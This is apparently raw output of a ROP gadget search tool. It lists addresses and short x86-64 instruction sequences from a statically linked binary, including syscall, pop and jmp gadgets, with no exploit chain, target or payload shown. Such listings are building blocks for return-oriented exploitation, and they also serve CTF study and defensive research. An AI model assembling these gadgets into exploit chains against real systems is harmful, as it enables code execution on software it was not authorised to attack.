0x000000000044fd03 : movsxd rax, dword ptr [rdx + rbx*4] ; add rax, rdx ; jmp rax
0x000000000047557a : movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x000000000044eb87 : movsxd rax, dword ptr [rsi + rdi*4] ; add rax, rsi ; jmp rax
0x000000000044ec41 : movsxd rax, dword ptr [rsi + rdx*4] ; add rax, rsi ; jmp rax
0x000000000048be7d : movsxd rax, ecx ; add rax, rdi ; sub rax, r8 ; ret
0x000000000044d657 : movsxd rax, ecx ; add rax, rdi ; sub rax, rsi ; ret
0x000000000044d604 : movsxd rax, ecx ; ret
0x000000000044d649 : movsxd rbx, ecx ; add cl, byte ptr [rdi] ; xchg eax, edx ; ror byte ptr [rdi], 0x94 ; ret 0xc085
0x0000000000432cfd : movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x000000000044aad9 : movsxd rcx, dword ptr [r11 + rdx*4] ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x000000000044ebaf : movsxd rcx, dword ptr [rsi + rax*4] ; add rcx, rsi ; jmp rcx
0x000000000044d697 : movsxd rcx, ecx ; lea rax, qword ptr [rdi + rcx] ; sub rax, rsi ; ret
0x0000000000413ec7 : movsxd rdi, dword ptr [r10 + rdi*4] ; add rdi, r10 ; jmp rdi
0x0000000000460fbf : movsxd rdi, dword ptr [r11 + rsi*4] ; add rdi, r11 ; jmp rdi
0x000000000043449f : movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x0000000000413bde : movsxd rdx, dword ptr [rdi + rdx*4] ; add rdx, rdi ; jmp rdx
0x000000000044ff79 : movsxd rdx, eax ; jmp 0x44fd23
0x0000000000460ac0 : movsxd rsi, dword ptr [r8 + r9*4] ; add rsi, r8 ; jmp rsi
0x000000000044cabc : movsxd rsi, esi ; ret 0x7520
0x000000000044db7f : movups xmmword ptr [r11], xmm4 ; ret
0x000000000044dc06 : movups xmmword ptr [r11], xmm8 ; ret
0x000000000044dc07 : movups xmmword ptr [rbx], xmm0 ; ret
0x000000000044db80 : movups xmmword ptr [rbx], xmm4 ; ret
0x000000000044db7b : movups xmmword ptr [rcx - 0x30], xmm0 ; movups xmmword ptr [r11], xmm4 ; ret
0x000000000044db7a : movups xmmword ptr [rcx - 0x30], xmm8 ; movups xmmword ptr [r11], xmm4 ; ret
0x000000000044dc02 : movups xmmword ptr [rdi + 0x30], xmm7 ; movups xmmword ptr [r11], xmm8 ; ret
0x000000000044d962 : movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x000000000044dae9 : movups xmmword ptr [rdi + rdx - 0x20], xmm3 ; ret
0x000000000044dac6 : movups xmmword ptr [rdi + rdx - 0x40], xmm7 ; ret
0x000000000044d95f : movups xmmword ptr [rdi], xmm0 ; movups xmmword ptr [rdi + rdx - 0x10], xmm1 ; ret
0x00000000004919c5 : movups xmmword ptr [rsp - 0x28], xmm0 ; ret
0x000000000047c461 : movzx eax, al ; add rsp, 0x58 ; ret
0x000000000048efbc : movzx eax, al ; neg eax ; ret
0x000000000048b889 : movzx eax, al ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000401dfa : movzx eax, al ; ret
0x0000000000455430 : movzx eax, al ; xor edx, edx ; add eax, 1 ; push rax ; call rbx
0x000000000041bfe0 : movzx eax, bpl ; pop rbx ; pop rbp ; pop r12 ; ret
0x0000000000494c1e : movzx eax, byte ptr [rax] ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x000000000041d1e1 : movzx eax, byte ptr [rax] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004196ce : movzx eax, byte ptr [rax] ; pop r12 ; pop r13 ; pop r14 ; ret
0x000000000041f26f : movzx eax, byte ptr [rax] ; ret
0x00000000004728f7 : movzx eax, byte ptr [rdi + rax] ; mov rax, qword ptr [rsi + rax*8] ; jmp rax
0x000000000042c6f8 : movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x0000000000432a90 : movzx eax, byte ptr [rdi] ; movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x00000000004325d0 : movzx eax, byte ptr [rdi] ; movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x000000000042c713 : movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x000000000041d1f0 : movzx eax, byte ptr [rdx] ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00000000004196e0 : movzx eax, byte ptr [rdx] ; ret
0x000000000041bfe1 : movzx eax, ch ; pop rbx ; pop rbp ; pop r12 ; ret
0x000000000044ec10 : movzx eax, cl ; pop rbx ; ret
0x000000000044d11a : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x44d119 ; ret
0x000000000044d1ca : movzx ecx, byte ptr [rsi + rdx + 3] ; test cl, cl ; jne 0x44d1c9 ; ret
0x0000000000433bb4 : movzx ecx, byte ptr [rsi - 1] ; sub eax, ecx ; ret
0x000000000044da38 : movzx ecx, byte ptr [rsi] ; mov byte ptr [rdi], cl ; ret
0x000000000042c710 : movzx ecx, byte ptr [rsi] ; movzx eax, byte ptr [rdi] ; sub eax, ecx ; ret
0x0000000000432a93 : movzx ecx, byte ptr [rsi] ; sub eax, ecx ; ret
0x0000000000414463 : movzx edx, byte ptr [rdi] ; test dl, dl ; jne 0x41444b ; ret
0x000000000042c8d1 : movzx edx, byte ptr [rdx + rcx] ; sub eax, edx ; ret
0x0000000000430d48 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; ret
0x0000000000432a18 : movzx edx, byte ptr [rsi + rcx] ; sub eax, edx ; vzeroupper ; ret
0x000000000042c763 : movzx edx, byte ptr [rsi + rdx] ; sub eax, edx ; ret
0x000000000044cae4 : movzx edx, byte ptr [rsi - 0x10] ; sub eax, edx ; ret
0x000000000044cb44 : movzx edx, byte ptr [rsi - 0xa] ; sub eax, edx ; ret
0x000000000044cb34 : movzx edx, byte ptr [rsi - 0xb] ; sub eax, edx ; ret
0x000000000044cb24 : movzx edx, byte ptr [rsi - 0xc] ; sub eax, edx ; ret
0x000000000044cb14 : movzx edx, byte ptr [rsi - 0xd] ; sub eax, edx ; ret
0x000000000044cb04 : movzx edx, byte ptr [rsi - 0xe] ; sub eax, edx ; ret
0x000000000044caf4 : movzx edx, byte ptr [rsi - 0xf] ; sub eax, edx ; ret
0x000000000043bc90 : movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x0000000000433967 : movzx edx, byte ptr [rsi - 1] ; sub eax, edx ; ret
0x000000000044cacb : movzx edx, byte ptr [rsi - 9] ; sub eax, edx ; ret
0x000000000043c370 : movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00000000004325d3 : movzx edx, byte ptr [rsi] ; sub eax, edx ; ret
0x00000000004325f9 : movzx edx, dl ; sub eax, edx ; ret
0x000000000043bc10 : movzx edx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x000000000043c300 : movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x0000000000479f67 : mul byte ptr [rsi + 0xf] ; outsd dx, dword ptr [rsi] ; push rdi ; xor byte ptr [rsi + 0xf], ah ; outsd dx, dword ptr [rsi] ; ret
0x00000000004262b2 : neg dl ; sub dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000450643 : neg eax ; jmp 0x45060c
0x0000000000450007 : neg eax ; mov dword ptr fs:[rcx], eax ; or rax, 0xffffffffffffffff ; ret
0x000000000041f2af : neg eax ; ret
0x00000000004018b7 : neg eax ; shr rax, 0x3f ; ret
0x00000000004018b6 : neg rax ; shr rax, 0x3f ; ret
0x00000000004b718c : nop ; add byte ptr [r8], r8b ; xor byte ptr [rax - 7], bh ; call qword ptr [rbx]
0x000000000043b3c7 : nop ; add byte ptr [rax], al ; add byte ptr [rax - 0x7f], cl ; ret 0x80
0x0000000000451de7 : nop ; add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x451df8 ; call r12
0x000000000043301c : nop ; add byte ptr [rax], al ; add byte ptr [rsi + 0xf], ah ; cmp byte ptr [rdi], dl ; ret 0x830f
0x000000000047c69c : nop ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x000000000045556f : nop ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x000000000048e95f : nop ; add rsp, 8 ; ret
0x000000000048c26f : nop ; call rax
0x0000000000455cb0 : nop ; call rsi
0x000000000049bc38 : nop ; cli ; jmp qword ptr [rax]
0x0000000000452c0f : nop ; cmp rcx, qword ptr [rax + 0x10] ; jae 0x452c08 ; ret
0x000000000049bbd0 : nop ; fdivp st(1) ; call rax
0x00000000004892df : nop ; jmp rdx
0x0000000000400dc8 : nop ; leave ; ret
0x000000000049b468 : nop ; mov ah, 0xf9 ; call qword ptr [rax + 0x20fff9b6]
0x000000000049b3cc : nop ; mov bh, 0xf9 ; jmp qword ptr [rax]
0x000000000049b3c8 : nop ; mov ch, 0xf9 ; call qword ptr [rax + 0x20fff9b7]
0x000000000049b46c : nop ; mov dh, 0xf9 ; jmp qword ptr [rax]
0x0000000000435f9f : nop ; mov dl, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x000000000041fcf3 : nop ; mov dword ptr [rip + 0x2a40da], eax ; ret
0x000000000043617f : nop ; mov dx, word ptr [rsi - 2] ; mov word ptr [rdi - 2], dx ; ret
0x000000000048beef : nop ; mov eax, 0x27 ; syscall ; ret
0x000000000047ba1f : nop ; mov eax, 0xc9 ; syscall ; ret
0x000000000041d60f : nop ; mov eax, 0xffffffff ; ret
0x00000000004868ff : nop ; mov eax, 1 ; pop rbx ; ret
0x000000000043653f : nop ; mov edx, dword ptr [rsi - 4] ; mov dword ptr [rdi - 4], edx ; ret
0x000000000044b26f : nop ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; lea rax, qword ptr [rdi + 3] ; ret
0x00000000004789e9 : nop ; mov qword ptr [rax], rdx ; xor eax, eax ; ret
0x000000000041fb73 : nop ; mov qword ptr [rip + 0x2a1ccd], rax ; ret
0x000000000041fb63 : nop ; mov qword ptr [rip + 0x2a1cd5], rax ; ret
0x000000000041fb13 : nop ; mov qword ptr [rip + 0x2a1cdd], rax ; ret
0x000000000041fb03 : nop ; mov qword ptr [rip + 0x2a1cf5], rax ; ret
0x0000000000493ddf : nop ; mov rax, qword ptr [rdi + 0x98] ; ret
0x0000000000491b4f : nop ; mov rax, qword ptr [rsi + 0xb8] ; ret
0x0000000000494cef : nop ; mov rax, qword ptr [rsi + 8] ; ret
0x000000000044ad0f : nop ; movdqu xmm0, xmmword ptr [rsi] ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x0000000000475d5f : nop ; or byte ptr [rbx + 0xc], 0x40 ; jmp 0x475d2e
0x0000000000475d5e : nop ; or byte ptr [rbx + 0xc], 0x40 ; jmp 0x475d2f
0x000000000049b918 : nop ; or edi, edx ; jmp qword ptr [rax]
0x0000000000400b4f : nop ; ret
0x000000000049b2d1 : nop ; stc ; call rsi
0x000000000041ee2f : nop ; sub edx, dword ptr [rax + 0x10] ; mov eax, dword ptr [rdi + 0x10] ; sub eax, edx ; ret
0x000000000049b4ec : nop ; wait ; stc ; jmp rax
0x000000000041b27f : nop ; xor eax, eax ; ret
0x00000000004153e8 : nop dword ptr [rax + rax] ; call qword ptr [rbx]
0x00000000004207c8 : nop dword ptr [rax + rax] ; call rax
0x000000000048c488 : nop dword ptr [rax + rax] ; call rbx
0x000000000044ac4b : nop dword ptr [rax + rax] ; mov edx, dword ptr [rsi] ; mov dword ptr [rdi], edx ; ret
0x0000000000400ad3 : nop dword ptr [rax + rax] ; pop rbp ; ret
0x0000000000418298 : nop dword ptr [rax + rax] ; pop rbx ; ret
0x0000000000400a9b : nop dword ptr [rax + rax] ; ret
0x000000000044d01b : nop dword ptr [rax + rax] ; xor eax, eax ; ret
0x000000000047b47c : nop dword ptr [rax] ; add rax, 1 ; ret
0x0000000000429f7d : nop dword ptr [rax] ; mov eax, 0x16 ; ret
0x0000000000478ae5 : nop dword ptr [rax] ; mov eax, 0xffffffff ; ret
0x000000000042123c : nop dword ptr [rax] ; mov rax, rdx ; ret
0x0000000000400b15 : nop dword ptr [rax] ; pop rbp ; ret
0x000000000044f23c : nop dword ptr [rax] ; pop rbx ; ret
0x00000000004207bd : nop dword ptr [rax] ; pop rbx ; xor eax, eax ; pop rbp ; pop r12 ; ret
0x000000000041ef41 : nop dword ptr [rax] ; ret
0x000000000041b1bd : nop dword ptr [rax] ; xor eax, eax ; jmp 0x41b18d
0x000000000041d745 : nop dword ptr [rax] ; xor eax, eax ; ret
0x000000000048c487 : nop dword ptr cs:[rax + rax] ; call rbx
0x00000000004153e7 : nop word ptr [rax + rax] ; call qword ptr [rbx]
0x00000000004207c7 : nop word ptr [rax + rax] ; call rax
0x000000000048b7fa : nop word ptr [rax + rax] ; pop rbx ; ret
0x000000000047b262 : nop word ptr [rax + rax] ; ret
0x000000000044ee1a : nop word ptr [rax + rax] ; xor eax, eax ; ret
0x00000000004ba741 : or ah, bh ; jmp qword ptr [rax]
0x00000000004035a2 : or ah, byte ptr [rbp - 0x45] ; or ch, byte ptr [rdx + 0x76] ; leave ; ret 0x8581
0x0000000000430ec7 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000445eff : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000430ef5 : or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000047c582 : or al, 0 ; add byte ptr [rax], al ; mov eax, 0xffffffff ; ret
0x000000000042472c : or al, 0 ; add byte ptr [rax], al ; mov rax, rsi ; ret
0x000000000047a8a8 : or al, 0 ; add byte ptr [rbx + rax - 0xd], dh ; ret
0x00000000004729ec : or al, 0 ; add byte ptr [rcx + 1], al ; ret 0x8b48
0x000000000046fa55 : or al, 0x13 ; add rdx, r12 ; call qword ptr [r10 + rax*8]
0x000000000042c6f6 : or al, 0x16 ; movzx eax, byte ptr [rdi + rdx] ; sub eax, ecx ; ret
0x00000000004246fa : or al, 0x1e ; mov rax, rsi ; pop rbx ; ret
0x0000000000419dd3 : or al, 0x24 ; mov rdi, rbx ; call rax
0x0000000000453fc3 : or al, 0x27 ; add byte ptr [rbp - 0xcf98b40], al ; ret
0x0000000000486559 : or al, 0x37 ; jae 0x486507 ; xor eax, eax ; ret
0x000000000042b070 : or al, 0x39 ; add al, byte ptr [rax] ; cmovne rax, rdx ; ret
0x0000000000475d62 : or al, 0x40 ; jmp 0x475d2b
0x0000000000475d61 : or al, 0x40 ; jmp 0x475d2c
0x00000000004b6d08 : or al, 0x43 ; add byte ptr [rax], al ; adc al, 0x89 ; clc ; jmp qword ptr [rsi]
0x00000000004506bd : or al, 0x48 ; add esp, 0x10 ; pop rbx ; ret
0x000000000041d0e3 : or al, 0x48 ; mov dword ptr [rsp], edi ; call 0x419377
0x0000000000407ab1 : or al, 0x48 ; mov eax, dword ptr [rsp + 0x18] ; call rax
0x000000000048bc43 : or al, 0x5b ; pop rbp ; pop r12 ; ret
0x0000000000475813 : or al, 0x7e ; ret 0x8944
0x000000000045f373 : or al, 0x83 ; inc byte ptr [rbx] ; je 0x45f387 ; ret
0x0000000000464d3b : or al, 0x83 ; ret
0x000000000044ebb1 : or al, 0x86 ; add rcx, rsi ; jmp rcx
0x0000000000469faa : or al, 0x89 ; ret 0xc689
0x000000000044ec3b : or al, 0x89 ; ret 0xe283
0x000000000042b363 : or al, 0x8a ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x0000000000441824 : or al, 0x8a ; mov eax, dword ptr [rdx + rax*4] ; sub eax, ecx ; ret
0x000000000043994d : or al, 0x8b ; add r9, r11 ; jmp r9
0x00000000004343cd : or al, 0x8b ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x000000000047c658 : or al, 0x8e ; add eax, dword ptr [rcx + rdx] ; ret
0x0000000000432cff : or al, 0x93 ; add rcx, r11 ; jmp rcx
0x000000000044aadb : or al, 0x93 ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00000000004343d1 : or al, 0xb ; jmp r9
0x000000000044aadf : or al, 0xb ; jmp rcx
0x0000000000417eb8 : or al, 0xe8 ; ret 0xec
0x000000000045d2af : or al, 0xe9 ; ret
0x000000000047878c : or al, 0xeb ; ret 0x5590
0x000000000043be93 : or al, 0xf3 ; movq qword ptr [rdi], mm1 ; ret
0x000000000046d70d : or al, 0xf6 ; ret 0xf01
0x000000000047f740 : or al, 0xf8 ; dec dword ptr [rax - 0x77] ; ret
0x000000000049b915 : or al, 0xfa ; call qword ptr [rax + 0x20fffa0b]
0x000000000049b755 : or al, 0xfa ; call rsi
0x0000000000429821 : or al, 9 ; ret 0xbae9
0x000000000047a85b : or al, byte ptr [rax] ; add byte ptr [rax + 0xf], cl ; ret 0x66c3
0x00000000004310a7 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444a91 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004310d5 : or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x0000000000493b0a : or al, byte ptr [rax] ; add byte ptr [rax], al ; mov edi, 1 ; call rax
0x000000000040df8d : or al, byte ptr [rbx - 0x7bf0fd07] ; ret
0x000000000041141c : or al, byte ptr [rbx - 0x7bf0fd07] ; ret 0x18
0x0000000000407309 : or al, byte ptr [rcx + 0x31] ; fild dword ptr [rcx] ; ret 0x8d42
0x00000000004531c6 : or al, byte ptr [rcx + rcx*8 - 0x7cb7ed8c] ; ret 0x4801
0x00000000004bb6cb : or al, byte ptr [rcx] ; ret
0x000000000040ecb7 : or al, ch ; ret
0x00000000004116f8 : or al, ch ; ret 0xffb2
0x0000000000423a87 : or al, ch ; xchg eax, ebx ; ret 0xffff
0x00000000004b2929 : or bh, dh ; call qword ptr [rax]
0x000000000041f9ec : or bh, dh ; dec dword ptr [rax - 0x77] ; ret
0x000000000042af50 : or bh, dh ; ret 0
0x000000000049b7e9 : or bh, dl ; call qword ptr [rdx + 0x22fffa09]
0x000000000049b765 : or bh, dl ; call qword ptr [rsi]
0x000000000049b925 : or bh, dl ; call rax
0x00000000004b8695 : or bh, dl ; call rcx
0x000000000049b921 : or bh, dl ; inc dword ptr [rax + 0xa] ; cli ; call rax
0x000000000049b8a5 : or bh, dl ; jmp rsp
0x000000000049b6c4 : or bl, 0xf9 ; call rax
0x000000000042123a : or bl, al ; nop dword ptr [rax] ; mov rax, rdx ; ret
0x000000000040c73d : or bl, byte ptr [rbx + 0x31] ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00000000004954fd : or bl, ch ; adc byte ptr [rax - 0x7d], cl ; ret
0x000000000043c053 : or bl, dh ; movq qword ptr [rdi], mm1 ; ret
0x0000000000401924 : or bl, dh ; ret
0x0000000000456926 : or byte ptr [r15], 0x8e ; ret 1
0x0000000000418091 : or byte ptr [r8 + 0x29], r9b ; ret
0x0000000000414a8d : or byte ptr [r8 + 0x39], cl ; ret
0x0000000000457cd3 : or byte ptr [r8 + 0xf], cl ; ret
0x000000000048b26f : or byte ptr [r8 + 2], r15b ; ret
0x000000000041815f : or byte ptr [r8 - 0x3f], r9b ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000048609a : or byte ptr [r8 - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000448f88 : or byte ptr [r8 - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000040210b : or byte ptr [r8 - 0x77], cl ; ret 0x4588
0x0000000000486585 : or byte ptr [r8 - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x000000000047f912 : or byte ptr [r8 - 0x7b], r9b ; ror byte ptr [rdi], 0x84 ; ret
0x000000000048b2b4 : or byte ptr [r9 + 0x2b802], r9b ; add byte ptr [rax], al ; ret
0x0000000000493567 : or byte ptr [r9 + 0x63], r9b ; add al, 0x86 ; add rax, r14 ; jmp rax
0x0000000000449047 : or byte ptr [r9 - 0x76b7f7be], cl ; clc ; ret
0x0000000000418092 : or byte ptr [rax + 0x29], cl ; ret
0x00000000004198c5 : or byte ptr [rax + 0x2b], cl ; push rbx ; cmp byte ptr [rax + 0x39], cl ; ret 0x2175
0x0000000000414a8e : or byte ptr [rax + 0x39], cl ; ret
0x0000000000459588 : or byte ptr [rax + 0x39], cl ; ret 0x8e0f
0x000000000041f269 : or byte ptr [rax + 0x39], cl ; sal byte ptr [rbx + 0x21], 1 ; movzx eax, byte ptr [rax] ; ret
0x00000000004b484e : or byte ptr [rax + 0xb], cl ; add dh, byte ptr [rbx + 0xa] ; ret
0x0000000000457cd4 : or byte ptr [rax + 0xf], cl ; ret
0x0000000000420316 : or byte ptr [rax + 0xf], cl ; scasd eax, dword ptr [rdi] ; ret 0x8948
0x000000000048d41c : or byte ptr [rax + 1], bh ; pop rbx ; pop rbp ; ret
0x0000000000402244 : or byte ptr [rax + 1], bh ; ret
0x0000000000484381 : or byte ptr [rax + 1], cl ; ret
0x0000000000402243 : or byte ptr [rax + 1], dil ; ret
0x000000000048b270 : or byte ptr [rax + 2], bh ; ret
0x0000000000401888 : or byte ptr [rax - 0x39], cl ; ret 1
0x0000000000418160 : or byte ptr [rax - 0x3f], cl ; sti ; add cl, byte ptr [rax + 0xf] ; scasd eax, dword ptr [rdi] ; ret
0x000000000041fbb3 : or byte ptr [rax - 0x75], cl ; adc byte ptr [rcx - 0x7d], al ; ret
0x00000000004512c4 : or byte ptr [rax - 0x75], cl ; and al, 0x10 ; call rax
0x0000000000451ca2 : or byte ptr [rax - 0x77], cl ; call 0xffffffffe1447a0b
0x0000000000448f8d : or byte ptr [rax - 0x77], cl ; clc ; ret
0x000000000048609b : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; pop r12 ; ret
0x0000000000450ede : or byte ptr [rax - 0x77], cl ; fcomp dword ptr [rbx + 0x5d] ; ret
0x000000000041d18b : or byte ptr [rax - 0x77], cl ; fistp word ptr [rbx + 0x5d] ; jmp rax
0x0000000000448f89 : or byte ptr [rax - 0x77], cl ; or byte ptr [rax - 0x77], cl ; clc ; ret
0x0000000000486440 : or byte ptr [rax - 0x77], cl ; ret
0x000000000040210c : or byte ptr [rax - 0x77], cl ; ret 0x4588
0x000000000049008a : or byte ptr [rax - 0x77], r9b ; ret
0x0000000000485fc8 : or byte ptr [rax - 0x7b], cl ; push qword ptr [rbp - 0x2e] ; ret
0x000000000047f913 : or byte ptr [rax - 0x7b], cl ; ror byte ptr [rdi], 0x84 ; ret
0x00000000004902de : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rax + rax*8 + 0x49], 0x83 ; ret 0xf608
0x0000000000486586 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rsi + 0x48], 0x89 ; ret
0x0000000000490337 : or byte ptr [rax - 0x7b], cl ; sal byte ptr [rsp + rsi*4 + 0x48], 0x83 ; ret 0xf608
0x0000000000425840 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rax]
0x0000000000462220 : or byte ptr [rax - 0x7d], cl ; call qword ptr [rbx]
0x0000000000451672 : or byte ptr [rax - 0x7d], cl ; ret
0x00000000004821c7 : or byte ptr [rax - 0x7d], cl ; ret 0x101
0x0000000000484832 : or byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000453080 : or byte ptr [rax - 0x7d], cl ; ret 0xf01
0x0000000000418776 : or byte ptr [rax - 1], bh ; pop rbx ; pop rbp ; ret
0x000000000049b934 : or byte ptr [rax], 0xfa ; call qword ptr [rax]
0x00000000004791fe : or byte ptr [rax], al ; add al, 0 ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x0000000000420edb : or byte ptr [rax], al ; add byte ptr [rax + 0x39], cl ; ret 0x840f
0x0000000000431377 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x0000000000444c31 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00000000004312b5 : or byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xeb10
0x000000000041df07 : or byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
0x0000000000457c7a : or byte ptr [rax], al ; add byte ptr [rax], al ; add dh, dh ; ret 0x4801
0x000000000044ec85 : or byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x0000000000455481 : or byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000426116 : or byte ptr [rax], al ; add byte ptr [rcx + rdi - 0x3e], cl ; jne 0x4260e9 ; ret
0x00000000004270ec : or byte ptr [rax], al ; add byte ptr [rdi], cl ; xchg eax, ebx ; ret 0x3d83
0x0000000000413bdc : or byte ptr [rax], al ; movsxd rdx, dword ptr [rdi + rdx*4] ; add rdx, rdi ; jmp rdx
0x00000000004462ee : or byte ptr [rax], r8b ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x0000000000493d5f : or byte ptr [rbp + 0x1a], dh ; mov rax, qword ptr [rax] ; ret
0x000000000048c63b : or byte ptr [rbp + 0x39481e04], cl ; ret 0x830f
0x00000000004896f1 : or byte ptr [rbp + 0x39], cl ; ret 0x8b48
0x000000000048c356 : or byte ptr [rbp + 0x440f4cf6], al ; ret
0x0000000000493dce : or byte ptr [rbp + 4], dh ; mov qword ptr [rax], rdx ; ret
0x0000000000401896 : or byte ptr [rbp + 9], cl ; fimul dword ptr [rax + 0xf] ; ret 0xc3f3
0x0000000000489373 : or byte ptr [rbp + rcx*4 + 0x24], cl ; ret 0x8d4a
0x00000000004238b2 : or byte ptr [rbp - 0x75], cl ; push rax ; or byte ptr [rcx - 0xa], al ; ret 0xf04
0x0000000000498d73 : or byte ptr [rbp - 0x77], cl ; ret
0x0000000000450cdc : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xc221
0x00000000004507f3 : or byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x94 ; ret 0xca21
0x0000000000401c3c : or byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x0000000000408515 : or byte ptr [rbx + 0x5d], bl ; ret
0x0000000000451b2e : or byte ptr [rbx + 0x94801e2], al ; ret 0x8949
0x00000000004247f7 : or byte ptr [rbx + 0x94807e0], al ; ret
0x00000000004247f6 : or byte ptr [rbx + 0x94807e0], r8b ; ret
0x0000000000475d60 : or byte ptr [rbx + 0xc], 0x40 ; jmp 0x475d2d
0x0000000000469c87 : or byte ptr [rbx - 0x1776cf3b], al ; pop rbx ; pop rbp ; ret
0x0000000000416749 : or byte ptr [rbx - 0x76fefbbe], al ; ret 0xe281
0x00000000004b357c : or byte ptr [rbx], 0 ; add byte ptr [rax - 0x6c], al ; cmc ; jmp qword ptr [rax]
0x000000000049b71c : or byte ptr [rbx], 0xfa ; call qword ptr [rax]
0x0000000000482239 : or byte ptr [rbx], al ; add byte ptr [rax], al ; ret
0x00000000004b2c54 : or byte ptr [rbx], al ; fild word ptr [rcx] ; ret
0x000000000048b05b : or byte ptr [rcx + 0x29], cl ; ret 0x894c
0x000000000048b2b5 : or byte ptr [rcx + 0x2b802], cl ; add byte ptr [rax], al ; ret
0x00000000004881dd : or byte ptr [rcx + 0x33], cl ; add byte ptr [r8 + 9], r9b ; ret 0x840f
0x000000000047fd62 : or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0x1475
0x000000000047fd34 : or byte ptr [rcx + 0x33], cl ; add dword ptr [rax + 9], ecx ; ret 0xe75
0x0000000000417018 : or byte ptr [rcx + 0x415d5bd0], cl ; pop rsp ; pop r13 ; ret
0x0000000000416e07 : or byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x0000000000490fb5 : or byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x00000000004767c3 : or byte ptr [rcx + 0x415d5bf0], cl ; pop rsp ; pop r13 ; ret
0x0000000000493568 : or byte ptr [rcx + 0x63], cl ; add al, 0x86 ; add rax, r14 ; jmp rax
0x00000000004757f9 : or byte ptr [rcx + 0xf], al ; mov dh, 0x40 ; add dword ptr [rcx - 0x77], eax ; ret 0xe883
0x000000000048ee7b : or byte ptr [rcx + 1], cl ; ret 0x894c
0x000000000048a050 : or byte ptr [rcx + rax - 0x3e], cl ; mov rax, rdx ; pop rbx ; ret
0x000000000049073b : or byte ptr [rcx + rcx*4 - 0x16], cl ; mov rsi, r12 ; mov edi, ebp ; call qword ptr [rax]
0x0000000000417d01 : or byte ptr [rcx + rcx*4 - 1], cl ; call rax
0x000000000048b062 : or byte ptr [rcx - 0x2feeb728], cl ; pop rbp ; pop rbx ; ret
0x00000000004bd304 : or byte ptr [rcx - 0x72480000], ch ; std ; call qword ptr [rdx]
0x0000000000451b9b : or byte ptr [rcx - 0x75], cl ; add al, byte ptr [rbx + 0x94801e0] ; ret 0x8949
0x0000000000449048 : or byte ptr [rcx - 0x76b7f7be], cl ; clc ; ret
0x0000000000427388 : or byte ptr [rcx - 0x77], cl ; ret
0x0000000000413dba : or byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x0000000000451336 : or byte ptr [rcx - 0xa], al ; ret
0x00000000004238b6 : or byte ptr [rcx - 0xa], al ; ret 0xf04
0x0000000000402291 : or byte ptr [rcx - 9], al ; ret
